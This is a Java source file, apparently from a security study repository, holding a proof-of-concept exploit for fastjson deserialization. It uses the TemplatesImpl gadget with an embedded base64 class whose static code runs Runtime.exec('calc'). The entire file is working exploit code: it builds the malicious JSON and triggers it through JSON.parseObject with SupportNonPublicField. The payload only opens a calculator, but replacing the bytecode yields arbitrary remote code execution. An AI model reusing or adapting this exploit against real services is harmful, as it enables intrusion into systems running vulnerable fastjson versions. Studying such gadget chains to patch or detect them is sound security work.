package vul;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

public class TemImpl {
    public static void main(String[] args) throws IOException {
        byte[] bytes = Files.readAllBytes(Paths.get("D:/1tmp/classes/CalcAbs.class"));
        byte[][] evil = {bytes};
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("@type", "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        jsonObject.put("_bytecodes", evil);
        jsonObject.put("_name", "1diot9");
        jsonObject.put("_class", null);
        jsonObject.put("_tfactory", new TransformerFactoryImpl());
        System.out.println(jsonObject.toJSONString());

        String poc = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_name\":\"1diot9\"," +
                "\"_bytecodes\":[\"yv66vgAAADQANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAlMQ2FsY0FiczsBAApFeGNlcHRpb25zBwAsAQAJdHJhbnNmb3JtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQAMQ2FsY0Ficy5qYXZhDAAIAAkHAC8MADAAMQEABGNhbGMMADIAMwEAB0NhbGNBYnMBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgALAAAADgADAAAACgAEAAsADQAMAAwAAAAMAAEAAAAOAA0ADgAAAA8AAAAEAAEAEAABABEAEgABAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAADwAMAAAAKgAEAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABUAFgACAAAAAQAXABgAAwABABEAGQACAAoAAAA/AAAAAwAAAAGxAAAAAgALAAAABgABAAAAEgAMAAAAIAADAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABoAGwACAA8AAAAEAAEAHAAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAUAAgAFQAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAiAAEAIwAAAAIAJA==\"],\"_tfactory\":{\t}," +
                "\"_outputProperties\":{ }}";

//        JSON.parse(poc);

        ParserConfig config = new ParserConfig();
        JSON.parseObject(poc, Object.class, config, Feature.SupportNonPublicField);
    }
}
